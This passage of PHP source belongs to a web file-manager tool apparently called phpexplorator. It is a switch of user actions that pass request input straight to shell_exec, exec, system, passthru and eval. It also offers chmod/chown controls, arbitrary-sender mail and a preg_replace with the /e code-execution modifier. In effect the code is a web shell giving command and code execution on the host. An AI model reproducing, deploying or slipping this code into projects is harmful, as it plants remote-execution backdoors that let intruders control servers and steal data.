                $PE_config["show_command_upload"] = "1"; //--(0,1)--1 to show phpexplorator command_upload
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_shell"] = "0";
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
            case "cmd_1":
                $PE_config["show_command_1"] = "1"; //--(0,1)--1 to show phpexplorator command_1
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_shell"] = "0";
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
            case "cmd_2":
                $PE_config["show_command_2"] = "1"; //--(0,1)--1 to show phpexplorator command_2
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_shell"] = "0";
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
            case "shell_exec_file":
            case "shell_exec":
                print(PE_shell($PE_config, $PE_thevar, $PE_language));
                if($PE_thevar["select_action"] == "shell_exec_file") $cmd = escapeshellcmd(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]));
                if($PE_thevar["select_action"] == "shell_exec") $cmd = escapeshellcmd($PE_thevar["the_file"]);
                print("<b>" . $PE_thevar["PE_current_dir"] . " >" . $cmd . "</b><br />");
                print("<pre>");
                print(wordwrap(htmlentities(shell_exec($cmd)), 100));
                print("</pre>");
                break;
            case "exec_file":

            case "exec":
                print(PE_shell($PE_config, $PE_thevar, $PE_language));
                if($PE_thevar["select_action"] == "exec_file") $cmd = escapeshellcmd(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]));
                if($PE_thevar["select_action"] == "exec") $cmd = escapeshellcmd($PE_thevar["the_file"]);
                exec($cmd, $_SESSION["PE_exe_output"]);

                array_push($_SESSION["PE_exe_output"], "\n" . $PE_thevar["PE_current_dir"] . " > " . $cmd . "\n");
                print("<pre>");
                print(wordwrap(htmlentities(implode(array_reverse($_SESSION["PE_exe_output"]), "\n")), 100));
                print("</pre>");

                if((strlen(implode($_SESSION["PE_exe_output"], "\n")) > 3000) && (count($_SESSION["PE_exe_output"]) > 1)){
                    array_shift($_SESSION["PE_exe_output"]);
                }

                break;
            case "system_file":
            case "system":
                print(PE_shell($PE_config, $PE_thevar, $PE_language));
                if($PE_thevar["select_action"] == "system_file") $cmd = escapeshellcmd(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]));
                if($PE_thevar["select_action"] == "system") $cmd = escapeshellcmd($PE_thevar["the_file"]);
                print("<b>" . $PE_thevar["PE_current_dir"] . " >" . $cmd . "</b><br />");
                print("<pre>");
                wordwrap(htmlentities(system($cmd)), 100);
                print("</pre>");
                break;

            case "replace":

                print(PE_replace($PE_config, $PE_thevar, $PE_language));
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				$sensitive = PE_getpost("sensitive"); //Getting variable [$sensitive] sended by form
				$regular = PE_getpost("regular"); //Getting variable [$regular] sended by form
				$recursive = PE_getpost("recursive"); //Getting variable [$recursive] sended by form

				$source_action = PE_getpost("source_action"); //Getting variable [$source_action] sended by form
				$destination_action = PE_getpost("destination_action"); //Getting variable [$destination_action] sended by form

				$source_type = PE_getpost("source_type"); //Getting variable [$source_type] sended by form
				$destination_type = PE_getpost("destination_type"); //Getting variable [$destination_type] sended by form


				$local_file_source = PE_getpost("local_file_source"); //Getting variable [$local_file_source] sended by form
				$remote_file_source = PE_getpost("remote_file_source"); //Getting variable [$remote_file_source] sended by form
				$destination_replace = realpath(PE_getpost("destination_replace")); //Getting variable [$destination_replace] sended by form

				$with_backup = PE_getpost("with_backup"); //Getting variable [$with_backup] sended by form
				$with_estension = PE_getpost("with_estension"); //Getting variable [$with_estension] sended by form

				$match_text = PE_getpost("match_text"); //Getting variable [$match_text] sended by form
				$replace_text = PE_getpost("replace_text"); //Getting variable [$replace_text] sended by form
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				$PE_attachment_location = $PE_thevar["PE_current_dir"];
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


				print("<br /> " .  PE_translate("Begining") . " ..... <br />");

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				$options = "Um";
				if($source_action=="php") $options .= "e";
				if($sensitive=="yes") $options .= "i";
				if($regular=="yes") $options .= "s";
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				if(ereg("<br />", $match_text)) $options .= "";
				if(ereg("<br />", $replace_text)) $options .= "";
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				if(empty($replace_text)) $destination_action = "find_only";
				if(empty($with_estension)) $with_estension = ".bak";
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				if(empty($destination_replace)) $destination_replace = realpath("./temp/");
				if(!is_dir($destination_replace)) mkdir($destination_replace);
				// if(!is_writable($destination_replace)) $destination_replace = getenv("TMP") . "/";
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				$array_source = array();
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				switch($source_type){
				    case "local_zip":
				    $PE_post_files=PE_upload($PE_config, $PE_thevar, $PE_language);
				    PE_unzip($PE_post_files[0], $destination_replace);
				    if($PE_post_files) $array_source = PE_getdir_all($PE_config, $destination_replace);
				    break;

				    case "local_folder":
				    $PE_post_files=PE_upload($PE_config, $PE_thevar, $PE_language);
				    if($PE_attachment_location)
				    $array_source = PE_getdir_all($PE_config, $PE_post_files[0]);
				    break;

				    case "remote_file":
				    if($remote_file_source) $array_source[] = $remote_file_source;
				    if($recursive) $array_source = PE_getdir_all($PE_config, realpath($remote_file_source));
				    break;

				    case "remote_zip":
				    PE_unzip($remote_file_source, $destination_replace);
				    if($remote_file_source)
				    $array_source = PE_getdir_all($PE_config, $destination_replace);
				    break;

				    case "remote_folder":
				    if($recursive){
				         $array_source = PE_getdir_all($PE_config, realpath($remote_file_source));
				    }else{
				        $dir = @opendir($remote_file_source);
				        while ($file = readdir($dir)){
				            if((!is_dir($remote_file_source . "/" .$file))){
				            $array_source[] = $remote_file_source . "/" .$file;
				            }
				        }
				    }
				    break;

				    case "local_file":

				    default:
				    $PE_post_files=PE_upload($PE_config, $PE_thevar, $PE_language);
				    if($PE_post_files) $array_source[] = $PE_attachment_location . "/" . basename($PE_post_files);
				    break;

				    }
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    $array_destination = array();
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				if(count($array_source)){
				    foreach($array_source as $value){

				    if(is_dir($value)){
					    print("<br /> " .  PE_translate("No action on folder") . " [" . $value . "] <br />");
					}else{
					// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					$contents = file_get_contents($value);
					// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				   if($destination_action=="find_only"){
				    // *************************
				    preg_match_all("|" . $match_text . "|" . $options . "", $contents, $matches);
				    if(empty($matches[0])){
				        print("<br />" .  PE_translate("Not Find in") . " [" . $value . "]<br />");
				    }else{
				        print("<br /> --[" . $matches[0][0] . "]-- " .  PE_translate("Finded in") . " [" . $value . "]<br />");
				        }

				    // ------------------------

				    // ------------------------
				    }else{
				    // ------------------------

				    // ------------------------
				    $new_file = $destination_replace . "/" . basename($value);
				    $array_destination[] = $new_file;
				    // ------------------------

				    // ------------------------
				    if($with_backup=="yes"){
				        print("<br /> " .  PE_translate("Creating backup for") . " [" . $new_file . $with_estension . "] <br />");
				        $fich = fopen($new_file . $with_estension, "w");
				        fputs($fich, $contents);
				        fclose($fich);
				    }
				    // ------------------------

				    // ------------------------
				    $replace_contents = preg_replace("/" . $match_text . "/" . $options, $replace_text, $contents);
				    $fich = fopen($new_file, "w");
				    fputs($fich, $replace_contents);
				    fclose($fich);
				    // ------------------------

				    // ------------------------
				    if($replace_contents==$contents){
				        print("<br /> " .  PE_translate("Zero Replace in") . " [" . $value . "]<br />");
				    }else{
				        print("<br /> " .  PE_translate("Finded and Replaced in") . " [" . $value . "]<br />");
				        }
				    // ------------------------

				    // ------------------------
				    }

				    // ------------------------

				    // ------------------------
					}

					} //end foreach
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    // -----------------------------------------------------
				    $zip_file = dirname($destination_replace) . "/" . $options . "_" . date("_Y_m_d_h_i_s") . "_replace.zip";
				    if((($destination_type=="remote_zip") || ($destination_type=="download")) && (count($array_destination) > 1)){
				    // ------------
				    $zip_data = zipfiles($array_destination, dirname($destination_replace), "UTF-8");
				    $fich = fopen($zip_file, "w");
				    fputs($fich, $zip_data);
				    fclose($fich);
				    print("<p>" .  PE_translate(" Click here") . " -> <h2>" . ($zip_file) . "</h2> - " . PE_translate(" to download the result") . "</p>");

				    if($destination_type=="download")
				     print("<br />Zip " .  PE_translate("file") . " [" . $zip_file . "] " .  PE_translate("Created") . " <br />");
				    // ------------
				    }
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    (count($array_destination) > 1) ? $export_file=$zip_file : $export_file=$new_file;
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    if($destination_type=="remote_folder") print(implode("<br />", $array_destination));
				    if($destination_type=="print") print("<br />" . $replace_contents . implode("<br /><br /><br />", $array_destination));
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					}else{
				     print("<br /> " .  PE_translate("Zero source file finded") . " <br />");
				    }
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    print("<br /> ...." . PE_translate(" Ending ") . "..... <br />");
				    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

                break;

            case "php_info":
                phpinfo();
                break;
            case "defined_constants":
                PE_print_r(get_defined_constants());
                break;
            case "print_r":
                eval("PE_print_r(" . $PE_thevar["the_file"] . ");");
                break;
            case "var_dump":
                eval("var_dump(" . $PE_thevar["the_file"] . ");");
                break;
            case "var_export":
                eval("var_export(" . $PE_thevar["the_file"] . ");");
                break;
            case "debug_backtrace":
                PE_print_r(debug_backtrace());
                break;
            case "rename":
                if(rename($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"], $PE_thevar["PE_current_stream"] . $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "dir_copy":
                if(PE_dir_copy($PE_config, $PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "move":
                if(PE_dir_move($PE_config, $PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "dir_move":
                if(PE_dir_move($PE_config, $PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;

            case "run_code":
                eval($PE_thevar["the_file"]);
                break;
            case "run_shell":
                print("<pre>");
                $cmd = escapeshellcmd($PE_thevar["the_file"]);
                // system($cmd);
                passthru($cmd, $cmd_r�turn);
                print(htmlentities($cmd_return));
                print("</pre>");
                break;
            case "set_mode":
                if(chmod($PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "set_owner":
                if(chown($PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "set_group":
                if(chgrp($PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "set_touch":
                if(!(isset($PE_thevar["the_value"]) && ($PE_thevar["the_value"]))){
                    $PE_thevar["the_value"] = date("Y-m-d H:i:s", time());
                }
                if(touch($PE_thevar["the_file"], strtotime($PE_thevar["the_value"]))){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "new_file":
                if($f = fopen($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"], "w+")){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                fclose($f);
                break;
            case "file_select":

                switch (PE_getpost('PE1_action_check')){
                    case "copy_all":
                    case "cut_all":
                        $_SESSION["PE_file_check"] = PE_getpost("PE1_file_check");
                        $_SESSION["PE_action_check"] = PE_getpost("PE1_action_check");
                        print("<br />Action " . str_replace("_", " ", $_SESSION["PE_action_check"]) . " run Successfully  on <br />");
                        // print_r($_SESSION["PE_file_check"]);
                        break;

                    case "paste_all":
                        $PE1_file_check = $_SESSION["PE_file_check"];
                        // print_r($_SESSION["PE_file_check"]);
                        foreach($PE1_file_check as $key => $val){
                            if(PE_dir_copy($PE_config, urldecode($val), $PE_thevar["PE_current_dir"])){
                                if($_SESSION["PE_action_check"] == "cut_all"){
                                    PE_dir_remove($PE_config, urldecode($val));
                                    print("<br />File " . urldecode($val) . " Paste.");
                                }
                            };
                        }

                        $_SESSION["PE_file_check"] = array();
                        print("<br />Action Paste run Successfully  on <br />");
                        break;

                    case "delete_all":
                        $PE1_file_check = $_POST["PE1_file_check"];
                        foreach($PE1_file_check as $key => $val){
                            PE_dir_remove($PE_config, urldecode($val));
                            print("<br />File " . urldecode($val) . " Cut.");
                        }
                        $_POST["PE1_file_check"] = array();
                        break;

                    default:
                    break;
                }
                break;

            case "save":

                $textmode = PE_getpost("PE_select_mode");
                if($textmode == "normal"){
                    $text = PE_getpost('PE_normal_textarea');
                }else{
                    $text = PE_getpost('PE_mce_textarea');
                }

                if($f = fopen($PE_thevar["PE_current_stream"].$PE_thevar["the_file"], "w")){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                };
                fwrite($f, stripslashes(html_entity_decode($text)));
                fclose($f);
                break;

            case "upload":
				PE_upload($PE_config, $PE_thevar, $PE_language);
                break;
            case "unzip":
                /**
                */
				PE_unzip($PE_config, $PE_thevar, $PE_language);
                break;
            default:
                $PE_config["show_shell"] = "1";
                $PE_config["show_replace"] = "0";
                $PE_config["show_command_extend"] = "1";
                $PE_config["show_command_upload"] = "1";
                $PE_config["show_command_1"] = "1";
                $PE_config["show_command_2"] = "1";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
        }
    }



// ------  all user actions ---------
    switch ($PE_thevar["select_action"]){
        case "md5_file":
            print(md5_file($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]));
            break;

        // case "count_line_file":
        // print("<pre>");
        // print_r(count_chars(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
        // print("</pre>");

        case "sha1_file":
            print(sha1_file($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]));
            break;
        case "str_word_count_file":
            print("<pre>");
            print(str_word_count(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "strlen_file":
            print("<pre>");
            print(strlen(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "md5_text":
            print(md5($PE_thevar["the_file"]));
            break;
        case "sha1_text":
            print(sha1($PE_thevar["the_file"]));
            break;
        case "crc32_text":
            print("<pre>");
            printf("%u\n", crc32(($PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "str_rot13_text":
            print("<pre>");
            print(str_rot13(($PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "base64_encode_text":
            print("<pre>");
            print(chunk_split(base64_encode(($PE_thevar["the_file"]))));
            print("</pre>");
            break;
        case "base64_decode_text":
            print("<pre>");
            print(base64_decode(($PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "urlencode_text":
            print("<pre>");
            print(urlencode(($PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "urldecode_text":
            print("<pre>");
            print(urldecode(($PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "email":
            print("<pre>");
            $PE_headers = "From: " . PE_getpost($PE_from) . "\r\nReply-To: " . PE_getpost($PE_from) . "\r\nX-Mailer: PHP" . phpversion();
            @mail(PE_getpost($PE_to), PE_getpost($PE_subject), PE_getpost($PE_message), $PE_headers);
            print("</pre>");
            break;
        case "mysql":
			$PE_link = mysql_connect($PE_host . ":" . $PE_port, $PE_user, $PE_password);
			if(!$PE_link){
			    die("Not Connect : " . mysql_error());
			}
			print("Connected normaly");
            print("<pre>");
			mysql_close($link);
			print("</pre>");
            break;



        case "property":
            if(is_dir($PE_thevar["the_file"])){
                print("<b>" . PE_translate("directory") . "</b>: " . $PE_thevar["PE_current_file"] . ";<br />");
                $dir_property = PE_getdir_all($PE_config, realpath($PE_thevar["the_file"]), 1);
                print("<b>" . PE_translate("total_size") . "</b>=" . PE_format_filesize($dir_property["total_size"]) . "; <br />");
                print("<b>" . PE_translate("total_object") . "</b>=" . $dir_property["total"] . "; <br />");
                print("<b>" . PE_translate("total_dir") . "</b>=" . $dir_property["count"]["dir"] . "; <br />");
                print("<b>" . PE_translate("total_files") . "</b>=" . $dir_property["count"]["file"] . "; <br /> <br />");
            }else{
                print("<b>" . PE_translate("file") . "</b>:");
                print("[" . $PE_thevar["PE_current_file"] . "], <b>" . PE_translate("action") . ":</b>[" . $PE_thevar["select_action"] . "], <b>Type:</b>[" . $PE_thevar["send_type"] . "]<br />");
            }
            $array_file_info = pathinfo($PE_thevar["the_file"]);
            foreach($array_file_info as $key => $value){
                if(!is_int($key)){
                    print("<b>" . $key . "</b>=" . $value . "; <br />");
                }
            }
            $array_file_info = stat($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]);
            foreach($array_file_info as $key => $value){
                if(!is_int($key)){
                    print("<b>" . $key . "</b>=" . $value . "; <br />");
                }
            }
            break;
        case "preview":
        case "view":
        case "select":
            ?>
	<fieldset class="bubble"><legend><?php print($PE_thevar["PE_current_file"]);?></legend>
         <table class="num1"  width="100%">
         <tr>
         <td align="center">
         <?php print("(" . $PE_thevar["select_action"] . ") " . $PE_thevar["PE_current_file"]);

            ?>
         </td>
         <td>
             <?php print(PE_form($PE_config, PE_translate("edit_file"), "hidden", "PE_the_file", $PE_thevar["PE_current_file"], "hidden", "PE_select_action", "edit", "", "", ""));

            ?>
         </td>

         </tr>
         </table>
    </fieldset>

         <?php
            if($PE_thevar["send_type"] == "image"){

                ?>
	<fieldset class="bubble"><legend><?php print($PE_thevar["PE_current_file"]);?></legend>
             <table align="center" class="num0" border="0">
             <tr><td>

                 <?php
                if(!empty($PE_config["self_header"])){
                    print("<img src=\"?". $PE_config["PE_key"]."=".$PE_config["PE_val"]."&" . "PE_imgpath=" . urlencode($PE_thevar["PE_current_file"]) . "\" title=\"" . $PE_thevar["PE_current_file"] . "\"  alt=\"" . $PE_thevar["PE_current_file"] . "\" border=\"1\" />");
                }else{
                    print("<img src=\"" . urlencode($PE_thevar["PE_current_file"]) . "\" title=\"" . $PE_thevar["PE_current_file"] . "\"  alt=\"" . $PE_thevar["PE_current_file"] . "\" border=\"1\" />");
                }

                ?>

             </td></tr>
             </table>
    </fieldset>
         <?php
            }
            /**
            */
            if($PE_thevar["send_type"] == "text"){

                ?>
	<fieldset class="bubble"><legend><?php print($PE_thevar["the_file"]);?></legend>
                <table class="num2"   width="100%">
                <tr><td align="left">
                <?php
                $array_file = split("<br />", highlight_file($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"], true));
                foreach($array_file as $key => $val){
                    print("<br />/*" . ($key + 1) . "*/  " . $val);
                }
            }

            ?>
            </td></tr>
            </table>
    </fieldset>
         </td>
         </tr>
         </table>
    </fieldset>

         <?php

            break;

        case "edit":
            ?>
         <br />
	<fieldset class="bubble"><legend><?php print(PE_translate("edit_text")) ." ". $PE_thevar["PE_current_file"];?></legend>
         <table class="num1"  width="100%">
         <tr>
         <td align="center">
         <b><u><?php print(PE_translate("edit_text"));

            ?></u></b> <?php print($PE_thevar["PE_current_file"]);

            ?>
         </td>
         <td>
         <?php print(PE_translate("editor_mode"));

            ?>
         <form method="post" action="<?php print($_SERVER["PHP_SELF"]);?>" >
         <?php print(PE_integration($PE_config, "input"));

            ?>
         <select id="select_mode2" name="PE_select_mode" onchange="PE_show_id2(this.form,'extend','PE_normal_textarea','PE_mce_textzone');">
         <option value="normal"><?php print(PE_translate("normal"));

            ?></option>
         <option value="extend"><?php print(PE_translate("extend"));

            ?></option>
         </select>
         </td>

         </tr>
         </table>
    </fieldset>

	<fieldset class="bubble"><legend><?php print($PE_thevar["PE_current_file"]);?></legend>
        <table class="num0"   width="100%">
         <tr><td align="center">

         <pre>
         <div id="PE_mce_textzone" style="visibility:hidden; display:none;">
         <textarea  rows="35" name="PE_mce_textarea" id="PE_mce_textarea"  cols="130">
         <?php
            $txt = file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["PE_current_file"]);
            print(htmlentities($txt));

            ?>
         </textarea>
         </div>
         </pre>

         <pre>
         <textarea  rows="35" name="PE_normal_textarea" id="PE_normal_textarea"  cols="130">
         <?php
            print(htmlentities($txt));

            ?>
         </textarea>
         </pre>
         <input type="hidden" name="PE_select_action" value="save" />
        <?php PE_stream_select($PE_config, $PE_thevar);?>

         <input type="submit" value="<?php print(PE_translate("save_to_file"));

            ?>" />:
         <input type="text" name="PE_the_file" value="<?php print($PE_thevar["PE_current_file"]);

            ?>" />
         </td>
         </tr>
        </table>
    </fieldset>

        </form>

         <br />

         <?php

            break;
        /**
        */
        case "list":
        default:
            $PE_thevar["select_action"] = "list";
            if(!is_dir($PE_thevar["the_file"])){
                $PE_thevar["PE_current_dir"] = realpath($PE_thevar["the_file"]);
                // $PE_thevar["the_file"]=eregi_replace(strstr($PE_thevar["the_file"], "/"), "", $PE_thevar["the_file"])."/";
            }
            break;
    }
    /**
    */
    print("</td></tr></table>");

    flush();
    return $PE_config;
}
/**
* PE_head_dir()
* show folder information
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_head_dir($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_head_dir"])) return $PE_config;

    ?>
<fieldset class="bubble"><legend><?php print("System");?></legend>
 <table class="num3"  width="100%">
 <tr class="rown2">
 <td align="left">
 <?php
    print("<u>" . php_uname() . "</u> - php user:(" . get_current_user() . ")<br />swap:");
// 	@ $dat_PE = getrusage();
// 	print($dat_PE ["ru_nswap"] . " - page faults:");         // numero di swap
// 	print($dat_PE ["ru_majflt"] . " - Used:");        // numero di page faults
// 	print($dat_PE ["ru_utime.tv_sec"] . "(seconds), ");  // tempo utente utilizzato (seconds)
// 	print($dat_PE ["ru_utime.tv_usec"] . "(microseconds)<br />"); // tempo utente utilizzato (microseconds)
    print("<b>" . PE_translate("total_space") . "</b>=" . PE_format_filesize(@ disk_total_space(dirname($PE_thevar["PE_current_dir"]))));
    print("; <b>" . PE_translate("free_space") . "</b>=" . PE_format_filesize(@ disk_free_space(dirname($PE_thevar["PE_current_dir"]))));
    print("<br />");
    print("<b>" . PE_translate("file") . "</b>: [" . $PE_thevar["PE_current_file"] . "], ");
    print("<b>" . PE_translate("action") . ":</b>[" . $PE_thevar["select_action"] . "]");
    // print(", <b>".PE_translate("type").":</b>[". $PE_thevar["send_type"]."]");
    if(is_file($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])){
        $array_file_info = stat($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]);
        foreach($array_file_info as $key => $value){
            if(!is_int($key)){
                print("<b>" . $key . "</b>=" . $value . "; ");
            }
        }
    }

    ?>
 </td>
 <td>
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" >


         <?php print(PE_integration($PE_config, "input"));

            ?>
    <select name="PE_select_lang" onchange="this.form.submit();">
 <option value="<?php print($_SESSION["PE_current_language"]);?>"><?php print(PE_translate("language"));?></option>
 <?php
    $dir = @ opendir($PE_config["lang_path"] . "/");
    while ($file = readdir($dir)){
        if(($file != ".") && ($file != "..") && (!eregi("^index\.", $file))){
            print("<option value=\"$file\">" . $file . "</option>");
        }
    }
    closedir($dir);

    ?>
 </select>

 <!--select name="PE_select_encoding" onchange="this.form.submit();">
 <option value="<?php print($_SESSION["PE_current_encoding"]);?>"><?php print($_SESSION["PE_current_encoding"]);?></option>
 <?php
 foreach($PE_config["encoding"] as $key => $value){
 print("<option value=\"".$value."\">".$value."</option>");
 }
    ?>
 </select!-->

 </form>
 </td>
  <td>
 <?php print(PE_form($PE_config, PE_translate("logout"), "hidden", "PE_logout", "yes", "hidden", "PE_select_action", "exit", "", "", ""));

    ?>
 </td>

 </tr>
 </table>
</fieldset>

<fieldset class="bubble"><legend><?php print("Action");?></legend>
 <table class="num1"  width="100%">
 <tr>
 <td align="left">
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" >
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <?php PE_stream_select($PE_config, $PE_thevar);?>


  <input size="40%" type="text" name="PE_the_file" value="<?php print($PE_thevar["PE_current_dir"]);

    ?>" />
 <input type="hidden" name="PE_select_action" value="list" />

<input type="submit" value="<?php print(PE_translate("explore"));

    ?>" />

 <select name="PE_view_mode" onchange="this.form.submit();">
 <option value="normal"><?php print(PE_getpost("PE_view_mode"));

    ?></option>
 <option value="normal"><?php print(PE_translate("normal"));

    ?></option>
 <option value="preview"><?php print(PE_translate("preview"));

    ?></option>
 </select>

 </form>
 </td>



 <td>
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);
    ?>" >
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <input type="hidden" name="PE_select_action" value="list" />
 <!--input type="submit" value="<?php print(PE_translate("go_to"));
    ?>" /-->
 <select name="PE_the_file" onchange="this.form.submit();">
 <option>/</option>
 <?php
 $partition=explode(",", $PE_config["partitions"]);
 foreach($partition as $key => $value){
 print("<option value=\"".$value."\">".$value."</option>");
 }
 ?>
 </select>
 </form>
 </td>



  <td>
 <?php print(PE_form($PE_config, PE_translate("go_root"), "hidden", "PE_the_file", "/", "hidden", "PE_select_action", "list", "", "", ""));

    ?>
 </td>

 <td>
 <?php print(PE_form($PE_config, PE_translate("go_home"), "hidden", "PE_the_file", "." . PE_path_separator(), "hidden", "PE_select_action", "list", "", "", ""));

    ?>
 </td>



 <td>
 <?php print(PE_form($PE_config, PE_translate("go_up"), "hidden", "PE_the_file", ".." . PE_path_separator(), "hidden", "PE_select_action", "list", "", "", ""));

    ?>
 </td>
 <td>
 <?php print(PE_form($PE_config, "PHP INFO", "hidden", "PE_the_file", "print(phpinfo());", "hidden", "PE_select_action", "run_code", "", "", ""));

    ?>
 </td>
 </tr>
 </table>
</fieldset>

<?php
    return $PE_config;
}
/**
* PE_dir_list()
* show all files and folders in the current directory
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_dir_list($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_dir_list"])) return $PE_config;
    // ===========================
    if($folder = @ opendir($PE_thevar["PE_current_stream"] . $PE_thevar["PE_current_dir"])){
        $j = 0;

        $count_dir = 0;
        $count_link = 0;
        $count_file = 0;
        $count_else = 0;

        $array_dir = array();
        $array_link = array();
